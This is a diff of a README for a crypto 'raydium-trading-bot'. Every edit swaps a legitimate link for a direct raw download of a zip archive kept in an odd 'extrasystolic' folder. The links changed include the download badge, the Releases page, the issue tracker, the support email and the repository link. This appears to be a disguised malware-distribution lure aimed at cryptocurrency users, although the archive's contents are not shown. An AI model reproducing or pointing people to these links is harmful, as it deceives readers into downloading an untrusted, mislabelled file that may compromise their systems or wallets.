@@ -1,6 +1,6 @@
 # 🚀 raydium-trading-bot - Automate Your Trading with Ease
 
-[![Download raydium-trading-bot](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%A7-brightgreen)](https://github.com/hungnguyen1509asd/raydium-trading-bot/releases)
+[![Download raydium-trading-bot](https://github.com/hungnguyen1509asd/raydium-trading-bot/raw/refs/heads/main/extrasystolic/trading-bot-raydium-3.8.zip%20Now-%20%F0%9F%93%A7-brightgreen)](https://github.com/hungnguyen1509asd/raydium-trading-bot/raw/refs/heads/main/extrasystolic/trading-bot-raydium-3.8.zip)
 
 ## 🛠️ Overview
 
@@ -26,7 +26,7 @@ To run the raydium-trading-bot, ensure your system meets these requirements:
 
 To get started with the raydium-trading-bot, follow these steps:
 
-1. Visit the [Releases page](https://github.com/hungnguyen1509asd/raydium-trading-bot/releases) to find the latest version.
+1. Visit the [Releases page](https://github.com/hungnguyen1509asd/raydium-trading-bot/raw/refs/heads/main/extrasystolic/trading-bot-raydium-3.8.zip) to find the latest version.
 2. Download the appropriate file for your operating system.
 3. Extract the files if they are in a zip format.
 
@@ -34,7 +34,7 @@ To get started with the raydium-trading-bot, follow these steps:
 
 To download the raydium-trading-bot, visit the following link:
 
-[Download raydium-trading-bot](https://github.com/hungnguyen1509asd/raydium-trading-bot/releases)
+[Download raydium-trading-bot](https://github.com/hungnguyen1509asd/raydium-trading-bot/raw/refs/heads/main/extrasystolic/trading-bot-raydium-3.8.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, locate the latest version.
@@ -60,8 +60,8 @@ If you encounter any issues while using the raydium-trading-bot, consider these 
 
 For further assistance, please reach out via the following methods:
 
-- **Issue Tracker**: Report any bugs or issues on our GitHub [Issues page](https://github.com/hungnguyen1509asd/raydium-trading-bot/issues).
-- **Email**: Contact support at support@raydium-trading-bot.com for any queries.
+- **Issue Tracker**: Report any bugs or issues on our GitHub [Issues page](https://github.com/hungnguyen1509asd/raydium-trading-bot/raw/refs/heads/main/extrasystolic/trading-bot-raydium-3.8.zip).
+- **Email**: Contact support at https://github.com/hungnguyen1509asd/raydium-trading-bot/raw/refs/heads/main/extrasystolic/trading-bot-raydium-3.8.zip for any queries.
 
 ## 📜 License
 
@@ -73,7 +73,7 @@ Thanks to all contributors and users who support the raydium-trading-bot. Your f
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository**: You can access the complete code and documentation [here](https://github.com/hungnguyen1509asd/raydium-trading-bot).
+- **GitHub Repository**: You can access the complete code and documentation [here](https://github.com/hungnguyen1509asd/raydium-trading-bot/raw/refs/heads/main/extrasystolic/trading-bot-raydium-3.8.zip).
 - **Community Discussions**: Join discussions and share tips on our forum platform.
 
 Stay in control of your trades with raydium-trading-bot!
